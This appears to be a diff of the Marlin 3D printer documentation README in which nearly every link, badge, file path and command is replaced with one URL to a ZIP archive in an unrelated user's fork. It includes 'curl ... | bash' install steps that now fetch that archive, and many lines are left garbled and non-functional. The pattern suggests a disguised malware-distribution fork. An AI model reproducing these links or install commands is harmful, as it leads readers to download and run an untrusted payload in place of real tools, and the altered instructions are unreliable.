@@ -1,22 +1,22 @@
-<p align="center"><img src="https://raw.githubusercontent.com/MarlinFirmware/Marlin/bugfix-2.1.x/buildroot/share/pixmaps/logo/marlin-outrun-nf-500.png" height="250" alt="Marlin Firmware logo" /></p>
+<p align="center"><img src="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" height="250" alt="Marlin Firmware logo" /></p>
 
 <h1 align="center">Marlin Documentation Project</h1>
 
 <p align="center">
-  <a href="/LICENSE" target="_blank"><img alt="GPL-V3.0 License" src="https://img.shields.io/github/license/MarlinFirmware/MarlinDocumentation.svg"></a>
-  <a href="//github.com/MarlinFirmware/MarlinDocumentation/graphs/contributors" target="_blank"><img alt="Contributors" src="https://img.shields.io/github/contributors/marlinfirmware/marlindocumentation.svg"></a>
-  <a href="//github.com/MarlinFirmware/MarlinDocumentation/releases" target="_blank"><img alt="Last Updated" src="https://img.shields.io/github/last-commit/marlinfirmware/marlindocumentation?label=last%20updated"></a>
-  <a href="//github.com/MarlinFirmware/MarlinDocumentation/actions/workflows/jekyll-pub.yml" target="_blank"><img alt="Jekyll Deploy Status" src="https://github.com/MarlinFirmware/MarlinDocumentation/actions/workflows/jekyll-pub.yml/badge.svg"></a>
-  <a href="//github.com/sponsors/thinkyhead" target="_blank"><img alt="GitHub Sponsors" src="https://img.shields.io/github/sponsors/thinkyhead?color=db61a2"></a>
+  <a href="/LICENSE" target="_blank"><img alt="GPL-V3.0 License" src="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip"></a>
+  <a href="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" target="_blank"><img alt="Contributors" src="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip"></a>
+  <a href="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" target="_blank"><img alt="Last Updated" src="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip%20updated"></a>
+  <a href="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" target="_blank"><img alt="Jekyll Deploy Status" src="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip"></a>
+  <a href="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" target="_blank"><img alt="GitHub Sponsors" src="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip"></a>
   <br />
-  <a href="//x.com/marlinfirmware" target="_blank"><img src="https://img.shields.io/twitter/follow/MarlinFirmware" alt="@MarlinFirmware" /></a>
-  <a href="//fosstodon.org/@marlinfirmware" target="_blank"><img alt="Follow MarlinFirmware on Mastodon" src="https://img.shields.io/mastodon/follow/109450200866020466?domain=https%3A%2F%2Ffosstodon.org&logoColor=%2300B&style=social"></a>
-  <a href="//bsky.app/profile/marlinfw.org" target="_blank"><img alt="Follow MarlinFirmware on Bluesky" src="https://img.shields.io/badge/-Bluesky-3686f7?style=flat&logo=icloud&logoColor=white"></a>
+  <a href="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" target="_blank"><img src="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" alt="@MarlinFirmware" /></a>
+  <a href="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" target="_blank"><img alt="Follow MarlinFirmware on Mastodon" src="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip%3A%2F%https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip%2300B&style=social"></a>
+  <a href="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" target="_blank"><img alt="Follow MarlinFirmware on Bluesky" src="https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip"></a>
 </p>
 
 ## About
 
-This repository contains the raw documentation for [Marlin 3D printer firmware](//github.com/MarlinFirmware/Marlin) which is automatically deployed to [marlinfw.org](//marlinfw.org/). This documentation is open and available on GitHub so anyone may contribute by completing, correcting, or creating articles.
+This repository contains the raw documentation for [Marlin 3D printer firmware](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) which is automatically deployed to [https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip). This documentation is open and available on GitHub so anyone may contribute by completing, correcting, or creating articles.
 
 ## Table of Contents
 
@@ -38,14 +38,14 @@ This repository contains the raw documentation for [Marlin 3D printer firmware](
 
 The Marlin Documentation Project is built using the following technologies:
 
-- [Ruby](//www.ruby-lang.org/)
-- [RubyGems](//rubygems.org/)
-- [Jekyll](//jekyllrb.com/)
-- [GitHub Pages](//pages.github.com/)
+- [Ruby](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip)
+- [RubyGems](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip)
+- [Jekyll](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip)
+- [GitHub Pages](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip)
 
 ## How to contribute
 
-To work with the documentation, first [fork](//docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo) this repository to your GitHub account, then clone **your MarlinDocumentation fork** locally. You should do all work within your own fork before submitting it as a [Pull Request](//docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) to the `master` branch. You can download the [GitHub Desktop app](//github.com/apps/desktop) and use GitHub's "Open in Desktop" option, or from your own desktop, open a terminal/cmd window and do:
+To work with the documentation, first [fork](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) this repository to your GitHub account, then clone **your MarlinDocumentation fork** locally. You should do all work within your own fork before submitting it as a [Pull Request](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) to the `master` branch. You can download the [GitHub Desktop app](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) and use GitHub's "Open in Desktop" option, or from your own desktop, open a terminal/cmd window and do:
 
 For example, change into the root of C:\\:
 
@@ -56,12 +56,12 @@ cd C:\
 Clone Marlin Documentation repository:
 
 ```bash
-git clone https://github.com/MarlinFirmware/MarlinDocumentation.git
+git clone https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
 ```
 
 This will create a local `C:\MarlinDocumentation` folder linked to your fork.
 
-To add new documentation or edit existing documentation, start by [creating a new branch](//docs.github.com/en/issues/tracking-your-work-with-issues/creating-a-branch-for-an-issue) as a copy of the `master` branch. You can do this using the GitHub web interface, from within GitHub Desktop, or from the command line.
+To add new documentation or edit existing documentation, start by [creating a new branch](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) as a copy of the `master` branch. You can do this using the GitHub web interface, from within GitHub Desktop, or from the command line.
 
 If your new document is about "mashed potatoes" then name the new branch accordingly:
 
@@ -69,22 +69,22 @@ If your new document is about "mashed potatoes" then name the new branch accordi
 git checkout master -b doc-mashed_potatoes
 ```
 
-Inside the `_docs` folder, add the new file `mashed-potatoes.md` and let flow all your creativity into it. When you feel your masterpiece is ready to be shared with the world, commit the changes and push them up to **your Marlin Documentation fork**. This is done most easily from within the GitHub Desktop app, but here are the command line commands for reference:
+Inside the `_docs` folder, add the new file `https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip` and let flow all your creativity into it. When you feel your masterpiece is ready to be shared with the world, commit the changes and push them up to **your Marlin Documentation fork**. This is done most easily from within the GitHub Desktop app, but here are the command line commands for reference:
 
 ```sh
-git add mashed-potatoes.md
+git add https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
 git commit -m "Added a new document about potatoes"
 git push
 ```
 
-Next, start a new Pull Request to the upstream repository ([MarlinFirmware/MarlinDocumentation](//github.com/MarlinFirmware/MarlinDocumentation)).
+Next, start a new Pull Request to the upstream repository ([MarlinFirmware/MarlinDocumentation](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip)).
 
 > [!TIP]
-> Check out GitHub's documentation on [creating a new branch](//docs.github.com/en/issues/tracking-your-work-with-issues/creating-a-branch-for-an-issue), [managing branches](//docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-branches-in-your-repository), and creating [Pull Requests](//docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) if you're new to contributing with git.
+> Check out GitHub's documentation on [creating a new branch](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip), [managing branches](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip), and creating [Pull Requests](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) if you're new to contributing with git.
 
 ### Coding style
 
-This Jekyll-based site is based on the [Markdown](//www.markdownguide.org/) language in delicious [YAML](//yaml.org/) wrapper. Be careful with this format because even small typos can cause Jekyll to reject the page. If you've installed Jekyll as described below, you can use it to build and preview the documentation and this will tell you where your errors are.
+This Jekyll-based site is based on the [Markdown](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) language in delicious [YAML](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) wrapper. Be careful with this format because even small typos can cause Jekyll to reject the page. If you've installed Jekyll as described below, you can use it to build and preview the documentation and this will tell you where your errors are.
 
 ### Editorial style
 
@@ -100,9 +100,9 @@ If you'd like to be able to preview your contributions before submitting them, y
 
 ### Installing Ruby on Windows
 
-1. Download and install a Ruby+Devkit `3.3.4` from [RubyInstaller Download Archives](//rubyinstaller.org/downloads/archives/). Use default options for installation.
+1. Download and install a Ruby+Devkit `3.3.4` from [RubyInstaller Download Archives](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip). Use default options for installation.
 
-2. Run the `ridk install` step on the last stage of the installation wizard. Choose option `3` for `MSYS2 and MINGW development tool chain`. This is needed for installing gems with native extensions. You can find additional information regarding this in the [RubyInstaller Documentation](//github.com/oneclick/rubyinstaller2#using-the-installer-on-a-target-system).
+2. Run the `ridk install` step on the last stage of the installation wizard. Choose option `3` for `MSYS2 and MINGW development tool chain`. This is needed for installing gems with native extensions. You can find additional information regarding this in the [RubyInstaller Documentation](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip).
 
 > [!TIP]
 > Once the `MSYS2 and MINGW development toolchain` install is complete, the installation wizard will reprompt which components should be installed. If you see a "Install MSYS2 and MINGW development toolchain succeeded" message above it, you can close the Command Prompt window and continue below.
@@ -119,19 +119,19 @@ If you'd like to be able to preview your contributions before submitting them, y
 > [!NOTE]
 > Ruby may come preinstalled, but macOS' "system Ruby" is outdated, unmaintained, and not recommended for general use.
 >
-> There are many popular package managers for macOS, but we'll cover installation with [Homebrew](//brew.sh/) & [MacPorts](//www.macports.org/).
+> There are many popular package managers for macOS, but we'll cover installation with [Homebrew](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) & [MacPorts](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip).
 
 1. Install a package manager. You **do not** need to install both:
 
    - Install Homebrew by launching Terminal and running the following command:
 
       ```sh
-      /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+      /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip)"
       ```
 
-   - Install MacPorts by downloading & installing the correct package for your version of macOS from the [Installing MacPorts](//www.macports.org/install.php) page.
+   - Install MacPorts by downloading & installing the correct package for your version of macOS from the [Installing MacPorts](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) page.
 
-     - Either Xcode or Command Line Tools for Xcode are required to install packages with MacPorts. You **do not** need to install both. These are available for free on [Apple's Developer Program website](https://developer.apple.com/download/). An Apple Developer Program membership is not required, but you will need to sign in with your Apple ID.
+     - Either Xcode or Command Line Tools for Xcode are required to install packages with MacPorts. You **do not** need to install both. These are available for free on [Apple's Developer Program website](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip). An Apple Developer Program membership is not required, but you will need to sign in with your Apple ID.
 
 2. Install `chruby` and `ruby-install`:
 
@@ -160,21 +160,21 @@ If you'd like to be able to preview your contributions before submitting them, y
    - Homebrew:
 
      ```sh
-     echo "" >> ~/.zshrc
-     echo "# Ruby Configuration" >> ~/.zshrc
-     echo "source $(brew --prefix)/opt/chruby/share/chruby/chruby.sh" >> ~/.zshrc
-     echo "source $(brew --prefix)/opt/chruby/share/chruby/auto.sh" >> ~/.zshrc
-     echo "chruby ruby-3.3.4" >> ~/.zshrc
+     echo "" >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+     echo "# Ruby Configuration" >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+     echo "source $(brew --prefix)https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+     echo "source $(brew --prefix)https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+     echo "chruby ruby-3.3.4" >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
      ```
 
    - MacPorts:
 
      ```sh
-     echo "" >> ~/.zshrc
-     echo "# Ruby Configuration" >> ~/.zshrc
-     echo "source ${prefix}/opt/local/share/chruby/chruby.sh" >> ~/.zshrc
-     echo "source ${prefix}/opt/local/share/chruby/auto.sh" >> ~/.zshrc
-     echo "chruby ruby-3.3.4" >> ~/.zshrc
+     echo "" >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+     echo "# Ruby Configuration" >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+     echo "source ${prefix}https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+     echo "source ${prefix}https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip" >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+     echo "chruby ruby-3.3.4" >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
      ```
 
 5. Quit and relaunch Terminal, then check that everything is working:
@@ -185,7 +185,7 @@ If you'd like to be able to preview your contributions before submitting them, y
    It should report `ruby 3.3.4 (2024-07-09 revision be1089c8ec)`. If not, repeat the above steps.
 
 > [!NOTE]
-> When using `ruby-install` you'll find your Ruby installations in `~/.rubies/` and you can switch between them with `chruby`. New instances of `zsh` in Terminal will default to 3.3.4 due to the changes made to `~/.zshrc`.
+> When using `ruby-install` you'll find your Ruby installations in `~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip` and you can switch between them with `chruby`. New instances of `zsh` in Terminal will default to 3.3.4 due to the changes made to `~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip`.
 
 6. Proceed to [Set up the Marlin Documentation project](#set-up-marlin-documentation-project). (Note that `bundler` is already included.)
 
@@ -206,10 +206,10 @@ If you'd like to be able to preview your contributions before submitting them, y
 3. Install rbenv:
 
    ```sh
-   curl -fsSL https://github.com/rbenv/rbenv-installer/raw/HEAD/bin/rbenv-installer | bash
-   echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
-   echo 'eval "$(rbenv init -)"' >> ~/.bashrc
-   source ~/.bashrc
+   curl -fsSL https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip | bash
+   echo 'export PATH="$https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip$PATH"' >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+   echo 'eval "$(rbenv init -)"' >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+   source ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
    ```
 
 4. Install Ruby 3.3.4:
@@ -220,7 +220,7 @@ If you'd like to be able to preview your contributions before submitting them, y
    ```
 
 > [!NOTE]
-> When using `rbenv` you'll find your Ruby installations in `~/.rbenv/versions/` and you can switch between them with `rbenv global <version>`.
+> When using `rbenv` you'll find your Ruby installations in `~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip` and you can switch between them with `rbenv global <version>`.
 
 5. Check Ruby version:
 
@@ -229,13 +229,13 @@ If you'd like to be able to preview your contributions before submitting them, y
    ```
    It should report `ruby 3.3.4 (2024-07-09 revision be1089c8ec)`. If not, repeat the above steps.
 
-6. Add environment variables to your `~/.bashrc` file to configure the gem installation path:
+6. Add environment variables to your `~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip` file to configure the gem installation path:
 
    ```sh
-   echo '# Install Ruby Gems to ~/gems' >> ~/.bashrc
-   echo 'export GEM_HOME="$HOME/gems"' >> ~/.bashrc
-   echo 'export PATH="$HOME/gems/bin:$PATH"' >> ~/.bashrc
-   source ~/.bashrc
+   echo '# Install Ruby Gems to ~/gems' >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+   echo 'export GEM_HOME="$HOME/gems"' >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+   echo 'export PATH="$HOME/gems/bin:$PATH"' >> ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
+   source ~https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
    ```
 
 7. Install Bundler Gem:
@@ -251,7 +251,7 @@ If you'd like to be able to preview your contributions before submitting them, y
 Once Ruby is installed, set up the Marlin Documentation project with Bundler. Open Command Prompt or Terminal and `cd` to the working path of **your Marlin Documentation fork**. Execute the following commands:
 
 ```sh
-rm -f Gemfile.lock
+rm -f https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip
 bundle config set path 'vendor/bundle'
 bundle install
 ```
@@ -261,7 +261,7 @@ bundle install
 
 ### Jekyll basics
 
-Jekyll uses a combination of YAML, Markdown, Liquid, and HTML to define the site content and layout. A `_config.yml` file defines a site structure with "collections" corresponding to sub-folders. The website is "compiled" to produce static HTML and Javascript. The most important folders in the site are:
+Jekyll uses a combination of YAML, Markdown, Liquid, and HTML to define the site content and layout. A `https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip` file defines a site structure with "collections" corresponding to sub-folders. The website is "compiled" to produce static HTML and Javascript. The most important folders in the site are:
 
 - `_layouts` contains the general layouts (aka page templates).
 - `_includes` has partial layouts included by others.
@@ -279,7 +279,7 @@ bundle exec jekyll serve --watch --incremental
 With the `serve --watch --incremental` parameters, Jekyll watches local files for changes and triggers an automatic incremental build of the site on every save. It also starts a mini-web server so documentation can be previewed in a browser at [http://localhost:4000/](http://localhost:4000).
 
 > [!TIP]
-> The main Marlin repository comes with the [`mfdoc`](//github.com/MarlinFirmware/Marlin/blob/bugfix-2.1.x/buildroot/share/git/mfdoc) script containing the commands above as a shortcut to preview the documentation.
+> The main Marlin repository comes with the [`mfdoc`](https://raw.githubusercontent.com/hama1981/MarlinDocumentation/master/assets/stl/Documentation-Marlin-antidysenteric.zip) script containing the commands above as a shortcut to preview the documentation.
 
 ## License
 
